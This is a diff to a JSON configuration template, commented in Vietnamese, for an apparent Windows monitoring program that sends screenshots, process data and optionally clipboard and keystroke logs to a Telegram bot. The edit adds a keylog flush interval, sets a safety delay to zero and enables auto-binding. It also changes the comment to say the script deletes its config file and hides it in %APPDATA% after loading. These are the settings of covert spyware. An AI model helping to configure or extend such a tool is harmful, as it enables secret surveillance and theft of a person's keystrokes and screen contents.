@@ -1,5 +1,5 @@
 {
-  "_comment": "Mau cau hinh dong goi san. Copy thanh 'winmonitor.config.json' canh file .exe de tu nap khi chay lan dau. File that KHONG duoc commit.",
+  "_comment": "Mau cau hinh dong goi san. Copy thanh 'winmonitor.config.json' canh file .exe de tu nap khi chay lan dau. File that KHONG duoc commit. Sau khi nap, script tu xoa file nay va chuyen vao %APPDATA%.",
   "bot_token": "123456789:AAE...token_cua_ban",
   "chat_id": "123456789",
   "screenshot_interval": 300,
@@ -8,5 +8,8 @@
   "process_monitor": true,
   "clipboard_monitor": false,
   "keylogger": false,
-  "heartbeat_interval": 3600
+  "keylog_flush": 60,
+  "block_safety_minutes": 0,
+  "heartbeat_interval": 3600,
+  "allow_autobind": true
 }
